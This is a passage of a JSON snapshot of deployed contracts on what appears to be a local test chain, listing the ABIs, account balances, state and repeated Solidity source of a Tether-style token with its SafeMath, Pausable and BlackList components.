StandardToken, BlackList {\\n\\n    string public name;\\n    string public symbol;\\n    uint public decimals;\\n    address public upgradedAddress;\\n    bool public deprecated;\\n\\n    //  The contract can be initialized with a number of tokens\\n    //  All the tokens are deposited to the owner address\\n    //\\n    // @param _balance Initial supply of the contract\\n    // @param _name Token Name\\n    // @param _symbol Token symbol\\n    // @param _decimals Token decimals\\n    function TetherToken(uint _initialSupply, string _name, string _symbol, uint _decimals) public {\\n        _totalSupply = _initialSupply;\\n        name = _name;\\n        symbol = _symbol;\\n        decimals = _decimals;\\n        balances[owner] = _initialSupply;\\n        deprecated = false;\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transfer(address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[msg.sender]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferByLegacy(msg.sender, _to, _value);\\n        } else {\\n            return super.transfer(_to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transferFrom(address _from, address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[_from]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferFromByLegacy(msg.sender, _from, _to, _value);\\n        } else {\\n            return super.transferFrom(_from, _to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function balanceOf(address who) public constant returns (uint) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).balanceOf(who);\\n        } else {\\n            return super.balanceOf(who);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).approveByLegacy(msg.sender, _spender, _value);\\n        } else {\\n            return super.approve(_spender, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).allowance(_owner, _spender);\\n        } else {\\n            return super.allowance(_owner, _spender);\\n        }\\n    }\\n\\n    // deprecate current contract in favour of a new one\\n    function deprecate(address _upgradedAddress) public onlyOwner {\\n        deprecated = true;\\n        upgradedAddress = _upgradedAddress;\\n        Deprecate(_upgradedAddress);\\n    }\\n\\n    // deprecate current contract if favour of a new one\\n    function totalSupply() public constant returns (uint) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).totalSupply();\\n        } else {\\n            return _totalSupply;\\n        }\\n    }\\n\\n    // Issue a new amount of tokens\\n    // these tokens are deposited into the owner address\\n    //\\n    // @param _amount Number of tokens to be issued\\n    function issue(uint amount) public onlyOwner {\\n        require(_totalSupply + amount > _totalSupply);\\n        require(balances[owner] + amount > balances[owner]);\\n\\n        balances[owner] += amount;\\n        _totalSupply += amount;\\n        Issue(amount);\\n    }\\n\\n    // Redeem tokens.\\n    // These tokens are withdrawn from the owner address\\n    // if the balance must be enough to cover the redeem\\n    // or the call will fail.\\n    // @param _amount Number of tokens to be issued\\n    function redeem(uint amount) public onlyOwner {\\n        require(_totalSupply >= amount);\\n        require(balances[owner] >= amount);\\n\\n        _totalSupply -= amount;\\n        balances[owner] -= amount;\\n        Redeem(amount);\\n    }\\n\\n    function setParams(uint newBasisPoints, uint newMaxFee) public onlyOwner {\\n        // Ensure transparency by hardcoding limit beyond which fees can never be added\\n        require(newBasisPoints < 20);\\n        require(newMaxFee < 50);\\n\\n        basisPointsRate = newBasisPoints;\\n        maximumFee = newMaxFee.mul(10**decimals);\\n\\n        Params(basisPointsRate, maximumFee);\\n    }\\n\\n    // Called when new token are issued\\n    event Issue(uint amount);\\n\\n    // Called when tokens are redeemed\\n    event Redeem(uint amount);\\n\\n    // Called when contract is deprecated\\n    event Deprecate(address newAddress);\\n\\n    // Called if contract ever adds fees\\n    event Params(uint feeBasisPoints, uint maxFee);\\n}",\n      "solc_version": "0.4.17"\n    },\n    {\n      "contract_name": "Pausable",\n      "address": "0xD833215cBcc3f914bD1C9ece3EE7BF8B14f841bb",\n      "abi": [\n        {\n          "constant": false,\n          "inputs": [],\n          "name": "unpause",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "paused",\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [],\n          "name": "pause",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "owner",\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "name": "transferOwnership",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "anonymous": false,\n          "inputs": [],\n          "name": "Pause",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [],\n          "name": "Unpause",\n          "type": "event"\n        }\n      ],\n      "functions": [\n        {\n          "name": "unpause",\n          "signature": "unpause()",\n          "inputs": [],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "paused",\n          "signature": "paused()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "pause",\n          "signature": "pause()",\n          "inputs": [],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "owner",\n          "signature": "owner()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "transferOwnership",\n          "signature": "transferOwnership(address)",\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        }\n      ],\n      "events": [\n        {\n          "name": "Pause",\n          "inputs": []\n        },\n        {\n          "name": "Unpause",\n          "inputs": []\n        }\n      ],\n      "accounts_balances": {\n        "0xD833215cBcc3f914bD1C9ece3EE7BF8B14f841bb": 0,\n        "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1": 99872199180000000000,\n        "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0": 100000000000000000000,\n        "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b": 100000000000000000000\n      },\n      "public_state": {\n        "_contract_eth_balance_wei": 0,\n        "_contract_eth_balance_eth": 0,\n        "paused": false,\n        "owner": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1"\n      },\n      "source_code_snippet": "pragma solidity ^0.4.17;\\n\\n/**\\n * @title SafeMath\\n * @dev Math operations with safety checks that throw on error\\n */\\nlibrary SafeMath {\\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\\n        if (a == 0) {\\n            return 0;\\n        }\\n        uint256 c = a * b;\\n        assert(c / a == b);\\n        return c;\\n    }\\n\\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\\n        // assert(b > 0); // Solidity automatically throws when dividing by 0\\n        uint256 c = a / b;\\n        // assert(a == b * c + a % b); // There is no case in which this doesn\'t hold\\n        return c;\\n    }\\n\\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\\n        assert(b <= a);\\n        return a - b;\\n    }\\n\\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\\n        uint256 c = a + b;\\n        assert(c >= a);\\n        return c;\\n    }\\n}\\n\\n/**\\n * @title Ownable\\n * @dev The Ownable contract has an owner address, and provides basic authorization control\\n * functions, this simplifies the implementation of \\"user permissions\\".\\n */\\ncontract Ownable {\\n    address public owner;\\n\\n    /**\\n      * @dev The Ownable constructor sets the original `owner` of the contract to the sender\\n      * account.\\n      */\\n    function Ownable() public {\\n        owner = msg.sender;\\n    }\\n\\n    /**\\n      * @dev Throws if called by any account other than the owner.\\n      */\\n    modifier onlyOwner() {\\n        require(msg.sender == owner);\\n        _;\\n    }\\n\\n    /**\\n    * @dev Allows the current owner to transfer control of the contract to a newOwner.\\n    * @param newOwner The address to transfer ownership to.\\n    */\\n    function transferOwnership(address newOwner) public onlyOwner {\\n        if (newOwner != address(0)) {\\n            owner = newOwner;\\n        }\\n    }\\n\\n}\\n\\n/**\\n * @title ERC20Basic\\n * @dev Simpler version of ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20Basic {\\n    uint public _totalSupply;\\n    function totalSupply() public constant returns (uint);\\n    function balanceOf(address who) public constant returns (uint);\\n    function transfer(address to, uint value) public;\\n    event Transfer(address indexed from, address indexed to, uint value);\\n}\\n\\n/**\\n * @title ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20 is ERC20Basic {\\n    function allowance(address owner, address spender) public constant returns (uint);\\n    function transferFrom(address from, address to, uint value) public;\\n    function approve(address spender, uint value) public;\\n    event Approval(address indexed owner, address indexed spender, uint value);\\n}\\n\\n/**\\n * @title Basic token\\n * @dev Basic version of StandardToken, with no allowances.\\n */\\ncontract BasicToken is Ownable, ERC20Basic {\\n    using SafeMath for uint;\\n\\n    mapping(address => uint) public balances;\\n\\n    // additional variables for use if transaction fees ever became necessary\\n    uint public basisPointsRate = 0;\\n    uint public maximumFee = 0;\\n\\n    /**\\n    * @dev Fix for the ERC20 short address attack.\\n    */\\n    modifier onlyPayloadSize(uint size) {\\n        require(!(msg.data.length < size + 4));\\n        _;\\n    }\\n\\n    /**\\n    * @dev transfer token for a specified address\\n    * @param _to The address to transfer to.\\n    * @param _value The amount to be transferred.\\n    */\\n    function transfer(address _to, uint _value) public onlyPayloadSize(2 * 32) {\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[msg.sender] = balances[msg.sender].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(msg.sender, owner, fee);\\n        }\\n        Transfer(msg.sender, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Gets the balance of the specified address.\\n    * @param _owner The address to query the the balance of.\\n    * @return An uint representing the amount owned by the passed address.\\n    */\\n    function balanceOf(address _owner) public constant returns (uint balance) {\\n        return balances[_owner];\\n    }\\n\\n}\\n\\n/**\\n * @title Standard ERC20 token\\n *\\n * @dev Implementation of the basic standard token.\\n * @dev https://github.com/ethereum/EIPs/issues/20\\n * @dev Based oncode by FirstBlood: https://github.com/Firstbloodio/token/blob/master/smart_contract/FirstBloodToken.sol\\n */\\ncontract StandardToken is BasicToken, ERC20 {\\n\\n    mapping (address => mapping (address => uint)) public allowed;\\n\\n    uint public constant MAX_UINT = 2**256 - 1;\\n\\n    /**\\n    * @dev Transfer tokens from one address to another\\n    * @param _from address The address which you want to send tokens from\\n    * @param _to address The address which you want to transfer to\\n    * @param _value uint the amount of tokens to be transferred\\n    */\\n    function transferFrom(address _from, address _to, uint _value) public onlyPayloadSize(3 * 32) {\\n        var _allowance = allowed[_from][msg.sender];\\n\\n        // Check is not needed because sub(_allowance, _value) will already throw if this condition is not met\\n        // if (_value > _allowance) throw;\\n\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        if (_allowance < MAX_UINT) {\\n            allowed[_from][msg.sender] = _allowance.sub(_value);\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[_from] = balances[_from].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(_from, owner, fee);\\n        }\\n        Transfer(_from, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.\\n    * @param _spender The address which will spend the funds.\\n    * @param _value The amount of tokens to be spent.\\n    */\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n\\n        // To change the approve amount you first have to reduce the addresses`\\n        //  allowance to zero by calling `approve(_spender, 0)` if it is not\\n        //  already 0 to mitigate the race condition described here:\\n        //  https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\\n        require(!((_value != 0) && (allowed[msg.sender][_spender] != 0)));\\n\\n        allowed[msg.sender][_spender] = _value;\\n        Approval(msg.sender, _spender, _value);\\n    }\\n\\n    /**\\n    * @dev Function to check the amount of tokens than an owner allowed to a spender.\\n    * @param _owner address The address which owns the funds.\\n    * @param _spender address The address which will spend the funds.\\n    * @return A uint specifying the amount of tokens still available for the spender.\\n    */\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        return allowed[_owner][_spender];\\n    }\\n\\n}\\n\\n\\n/**\\n * @title Pausable\\n * @dev Base contract which allows children to implement an emergency stop mechanism.\\n */\\ncontract Pausable is Ownable {\\n  event Pause();\\n  event Unpause();\\n\\n  bool public paused = false;\\n\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is not paused.\\n   */\\n  modifier whenNotPaused() {\\n    require(!paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is paused.\\n   */\\n  modifier whenPaused() {\\n    require(paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev called by the owner to pause, triggers stopped state\\n   */\\n  function pause() onlyOwner whenNotPaused public {\\n    paused = true;\\n    Pause();\\n  }\\n\\n  /**\\n   * @dev called by the owner to unpause, returns to normal state\\n   */\\n  function unpause() onlyOwner whenPaused public {\\n    paused = false;\\n    Unpause();\\n  }\\n}\\n\\ncontract BlackList is Ownable, BasicToken {\\n\\n    /////// Getters to allow the same blacklist to be used also by other contracts (including upgraded Tether) ///////\\n    function getBlackListStatus(address _maker) external constant returns (bool) {\\n        return isBlackListed[_maker];\\n    }\\n\\n    function getOwner() external constant returns (address) {\\n        return owner;\\n    }\\n\\n    mapping (address => bool) public isBlackListed;\\n    \\n    function addBlackList (address _evilUser) public onlyOwner {\\n        isBlackListed[_evilUser] = true;\\n        AddedBlackList(_evilUser);\\n    }\\n\\n    function removeBlackList (address _clearedUser) public onlyOwner {\\n        isBlackListed[_clearedUser] = false;\\n        RemovedBlackList(_clearedUser);\\n    }\\n\\n    function destroyBlackFunds (address _blackListedUser) public onlyOwner {\\n        require(isBlackListed[_blackListedUser]);\\n        uint dirtyFunds = balanceOf(_blackListedUser);\\n        balances[_blackListedUser] = 0;\\n        _totalSupply -= dirtyFunds;\\n        DestroyedBlackFunds(_blackListedUser, dirtyFunds);\\n    }\\n\\n    event DestroyedBlackFunds(address _blackListedUser, uint _balance);\\n\\n    event AddedBlackList(address _user);\\n\\n    event RemovedBlackList(address _user);\\n\\n}\\n\\ncontract UpgradedStandardToken is StandardToken{\\n    // those methods are called by the legacy contract\\n    // and they must ensure msg.sender to be the contract address\\n    function transferByLegacy(address from, address to, uint value) public;\\n    function transferFromByLegacy(address sender, address from, address spender, uint value) public;\\n    function approveByLegacy(address from, address spender, uint value) public;\\n}\\n\\ncontract TetherToken is Pausable, StandardToken, BlackList {\\n\\n    string public name;\\n    string public symbol;\\n    uint public decimals;\\n    address public upgradedAddress;\\n    bool public deprecated;\\n\\n    //  The contract can be initialized with a number of tokens\\n    //  All the tokens are deposited to the owner address\\n    //\\n    // @param _balance Initial supply of the contract\\n    // @param _name Token Name\\n    // @param _symbol Token symbol\\n    // @param _decimals Token decimals\\n    function TetherToken(uint _initialSupply, string _name, string _symbol, uint _decimals) public {\\n        _totalSupply = _initialSupply;\\n        name = _name;\\n        symbol = _symbol;\\n        decimals = _decimals;\\n        balances[owner] = _initialSupply;\\n        deprecated = false;\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transfer(address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[msg.sender]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferByLegacy(msg.sender, _to, _value);\\n        } else {\\n            return super.transfer(_to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transferFrom(address _from, address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[_from]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferFromByLegacy(msg.sender, _from, _to, _value);\\n        } else {\\n            return super.transferFrom(_from, _to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function balanceOf(address who) public constant returns (uint) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).balanceOf(who);\\n        } else {\\n            return super.balanceOf(who);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).approveByLegacy(msg.sender, _spender, _value);\\n        } else {\\n            return super.approve(_spender, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).allowance(_owner, _spender);\\n        } else {\\n            return super.allowance(_owner, _spender);\\n        }\\n    }\\n\\n    // deprecate current contract in favour of a new one\\n    function deprecate(address _upgradedAddress) public onlyOwner {\\n        deprecated = true;\\n        upgradedAddress = _upgradedAddress;\\n        Deprecate(_upgradedAddress);\\n    }\\n\\n    // deprecate current contract if favour of a new one\\n    function totalSupply() public constant returns (uint) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).totalSupply();\\n        } else {\\n            return _totalSupply;\\n        }\\n    }\\n\\n    // Issue a new amount of tokens\\n    // these tokens are deposited into the owner address\\n    //\\n    // @param _amount Number of tokens to be issued\\n    function issue(uint amount) public onlyOwner {\\n        require(_totalSupply + amount > _totalSupply);\\n        require(balances[owner] + amount > balances[owner]);\\n\\n        balances[owner] += amount;\\n        _totalSupply += amount;\\n        Issue(amount);\\n    }\\n\\n    // Redeem tokens.\\n    // These tokens are withdrawn from the owner address\\n    // if the balance must be enough to cover the redeem\\n    // or the call will fail.\\n    // @param _amount Number of tokens to be issued\\n    function redeem(uint amount) public onlyOwner {\\n        require(_totalSupply >= amount);\\n        require(balances[owner] >= amount);\\n\\n        _totalSupply -= amount;\\n        balances[owner] -= amount;\\n        Redeem(amount);\\n    }\\n\\n    function setParams(uint newBasisPoints, uint newMaxFee) public onlyOwner {\\n        // Ensure transparency by hardcoding limit beyond which fees can never be added\\n        require(newBasisPoints < 20);\\n        require(newMaxFee < 50);\\n\\n        basisPointsRate = newBasisPoints;\\n        maximumFee = newMaxFee.mul(10**decimals);\\n\\n        Params(basisPointsRate, maximumFee);\\n    }\\n\\n    // Called when new token are issued\\n    event Issue(uint amount);\\n\\n    // Called when tokens are redeemed\\n    event Redeem(uint amount);\\n\\n    // Called when contract is deprecated\\n    event Deprecate(address newAddress);\\n\\n    // Called if contract ever adds fees\\n    event Params(uint feeBasisPoints, uint maxFee);\\n}",\n      "solc_version": "0.4.17"\n    },\n    {\n      "contract_name": "SafeMath",\n      "address": "0x9561C133DD8580860B6b7E504bC5Aa500f0f06a7",\n      "abi": [],\n      "functions": [],\n      "events": [],\n      "accounts_balances": {\n        "0x9561C133DD8580860B6b7E504bC5Aa500f0f06a7": 0,\n        "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1": 99872199180000000000,\n        "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0": 100000000000000000000,\n        "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b": 100000000000000000000\n      },\n      "public_state": {\n        "_contract_eth_balance_wei": 0,\n        "_contract_eth_balance_eth": 0\n      },\n      "source_code_snippet": "pragma solidity ^0.4.17;\\n\\n/**\\n * @title SafeMath\\n * @dev Math operations with safety checks that throw on error\\n */\\nlibrary SafeMath {\\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\\n        if (a == 0) {\\n            return 0;\\n        }\\n        uint256 c = a * b;\\n        assert(c / a == b);\\n        return c;\\n    }\\n\\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\\n        // assert(b > 0); // Solidity automatically throws when dividing by 0\\n        uint256 c = a / b;\\n        // assert(a == b * c + a % b); // There is no case in which this doesn\'t hold\\n        return c;\\n    }\\n\\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\\n        assert(b <= a);\\n        return a - b;\\n    }\\n\\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\\n        uint256 c = a + b;\\n        assert(c >= a);\\n        return c;\\n    }\\n}\\n\\n/**\\n * @title Ownable\\n * @dev The Ownable contract has an owner address, and provides basic authorization control\\n * functions, this simplifies the implementation of \\"user permissions\\".\\n */\\ncontract Ownable {\\n    address public owner;\\n\\n    /**\\n      * @dev The Ownable constructor sets the original `owner` of the contract to the sender\\n      * account.\\n      */\\n    function Ownable() public {\\n        owner = msg.sender;\\n    }\\n\\n    /**\\n      * @dev Throws if called by any account other than the owner.\\n      */\\n    modifier onlyOwner() {\\n        require(msg.sender == owner);\\n        _;\\n    }\\n\\n    /**\\n    * @dev Allows the current owner to transfer control of the contract to a newOwner.\\n    * @param newOwner The address to transfer ownership to.\\n    */\\n    function transferOwnership(address newOwner) public onlyOwner {\\n        if (newOwner != address(0)) {\\n            owner = newOwner;\\n        }\\n    }\\n\\n}\\n\\n/**\\n * @title ERC20Basic\\n * @dev Simpler version of ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20Basic {\\n    uint public _totalSupply;\\n    function totalSupply() public constant returns (uint);\\n    function balanceOf(address who) public constant returns (uint);\\n    function transfer(address to, uint value) public;\\n    event Transfer(address indexed from, address indexed to, uint value);\\n}\\n\\n/**\\n * @title ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20 is ERC20Basic {\\n    function allowance(address owner, address spender) public constant returns (uint);\\n    function transferFrom(address from, address to, uint value) public;\\n    function approve(address spender, uint value) public;\\n    event Approval(address indexed owner, address indexed spender, uint value);\\n}\\n\\n/**\\n * @title Basic token\\n * @dev Basic version of StandardToken, with no allowances.\\n */\\ncontract BasicToken is Ownable, ERC20Basic {\\n    using SafeMath for uint;\\n\\n    mapping(address => uint) public balances;\\n\\n    // additional variables for use if transaction fees ever became necessary\\n    uint public basisPointsRate = 0;\\n    uint public maximumFee = 0;\\n\\n    /**\\n    * @dev Fix for the ERC20 short address attack.\\n    */\\n    modifier onlyPayloadSize(uint size) {\\n        require(!(msg.data.length < size + 4));\\n        _;\\n    }\\n\\n    /**\\n    * @dev transfer token for a specified address\\n    * @param _to The address to transfer to.\\n    * @param _value The amount to be transferred.\\n    */\\n    function transfer(address _to, uint _value) public onlyPayloadSize(2 * 32) {\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[msg.sender] = balances[msg.sender].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(msg.sender, owner, fee);\\n        }\\n        Transfer(msg.sender, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Gets the balance of the specified address.\\n    * @param _owner The address to query the the balance of.\\n    * @return An uint representing the amount owned by the passed address.\\n    */\\n    function balanceOf(address _owner) public constant returns (uint balance) {\\n        return balances[_owner];\\n    }\\n\\n}\\n\\n/**\\n * @title Standard ERC20 token\\n *\\n * @dev Implementation of the basic standard token.\\n * @dev https://github.com/ethereum/EIPs/issues/20\\n * @dev Based oncode by FirstBlood: https://github.com/Firstbloodio/token/blob/master/smart_contract/FirstBloodToken.sol\\n */\\ncontract StandardToken is BasicToken, ERC20 {\\n\\n    mapping (address => mapping (address => uint)) public allowed;\\n\\n    uint public constant MAX_UINT = 2**256 - 1;\\n\\n    /**\\n    * @dev Transfer tokens from one address to another\\n    * @param _from address The address which you want to send tokens from\\n    * @param _to address The address which you want to transfer to\\n    * @param _value uint the amount of tokens to be transferred\\n    */\\n    function transferFrom(address _from, address _to, uint _value) public onlyPayloadSize(3 * 32) {\\n        var _allowance = allowed[_from][msg.sender];\\n\\n        // Check is not needed because sub(_allowance, _value) will already throw if this condition is not met\\n        // if (_value > _allowance) throw;\\n\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        if (_allowance < MAX_UINT) {\\n            allowed[_from][msg.sender] = _allowance.sub(_value);\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[_from] = balances[_from].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(_from, owner, fee);\\n        }\\n        Transfer(_from, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.\\n    * @param _spender The address which will spend the funds.\\n    * @param _value The amount of tokens to be spent.\\n    */\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n\\n        // To change the approve amount you first have to reduce the addresses`\\n        //  allowance to zero by calling `approve(_spender, 0)` if it is not\\n        //  already 0 to mitigate the race condition described here:\\n        //  https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\\n        require(!((_value != 0) && (allowed[msg.sender][_spender] != 0)));\\n\\n        allowed[msg.sender][_spender] = _value;\\n        Approval(msg.sender, _spender, _value);\\n    }\\n\\n    /**\\n    * @dev Function to check the amount of tokens than an owner allowed to a spender.\\n    * @param _owner address The address which owns the funds.\\n    * @param _spender address The address which will spend the funds.\\n    * @return A uint specifying the amount of tokens still available for the spender.\\n    */\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        return allowed[_owner][_spender];\\n    }\\n\\n}\\n\\n\\n/**\\n * @title Pausable\\n * @dev Base contract which allows children to implement an emergency stop mechanism.\\n */\\ncontract Pausable is Ownable {\\n  event Pause();\\n  event Unpause();\\n\\n  bool public paused = false;\\n\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is not paused.\\n   */\\n  modifier whenNotPaused() {\\n    require(!paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is paused.\\n   */\\n  modifier whenPaused() {\\n    require(paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev called by the owner to pause, triggers stopped state\\n   */\\n  function pause() onlyOwner whenNotPaused public {\\n    paused = true;\\n    Pause();\\n  }\\n\\n  /**\\n   * @dev called by the owner to unpause, returns to normal state\\n   */\\n  function unpause() onlyOwner whenPaused public {\\n    paused = false;\\n    Unpause();\\n  }\\n}\\n\\ncontract BlackList is Ownable, BasicToken {\\n\\n    /////// Getters to allow the same blacklist to be used also by other contracts (including upgraded Tether) ///////\\n    function getBlackListStatus(address _maker) external constant returns (bool) {\\n        return isBlackListed[_maker];\\n    }\\n\\n    function getOwner() external constant returns (address) {\\n        return owner;\\n    }\\n\\n    mapping (address => bool) public isBlackListed;\\n    \\n    function addBlackList (address _evilUser) public onlyOwner {\\n        isBlackListed[_evilUser] = true;\\n        AddedBlackList(_evilUser);\\n    }\\n\\n    function removeBlackList (address _clearedUser) public onlyOwner {\\n        isBlackListed[_clearedUser] = false;\\n        RemovedBlackList(_clearedUser);\\n    }\\n\\n    function destroyBlackFunds (address _blackListedUser) public onlyOwner {\\n        require(isBlackListed[_blackListedUser]);\\n        uint dirtyFunds = balanceOf(_blackListedUser);\\n        balances[_blackListedUser] = 0;\\n        _totalSupply -= dirtyFunds;\\n        DestroyedBlackFunds(_blackListedUser, dirtyFunds);\\n    }\\n\\n    event DestroyedBlackFunds(address _blackListedUser, uint _balance);\\n\\n    event AddedBlackList(address _user);\\n\\n    event RemovedBlackList(address _user);\\n\\n}\\n\\ncontract UpgradedStandardToken is StandardToken{\\n    // those methods are called by the legacy contract\\n    // and they must ensure msg.sender to be the contract address\\n    function transferByLegacy(address from, address to, uint value) public;\\n    function transferFromByLegacy(address sender, address from, address spender, uint value) public;\\n    function approveByLegacy(address from, address spender, uint value) public;\\n}\\n\\ncontract TetherToken is Pausable, StandardToken, BlackList {\\n\\n    string public name;\\n    string public symbol;\\n    uint public decimals;\\n    address public upgradedAddress;\\n    bool public deprecated;\\n\\n    //  The contract can be initialized with a number of tokens\\n    //  All the tokens are deposited to the owner address\\n    //\\n    // @param _balance Initial supply of the contract\\n    // @param _name Token Name\\n    // @param _symbol Token symbol\\n    // @param _decimals Token decimals\\n    function TetherToken(uint _initialSupply, string _name, string _symbol, uint _decimals) public {\\n        _totalSupply = _initialSupply;\\n        name = _name;\\n        symbol = _symbol;\\n        decimals = _decimals;\\n        balances[owner] = _initialSupply;\\n        deprecated = false;\\n    }\\n\\n    // Forward ERC20 methods to upgraded 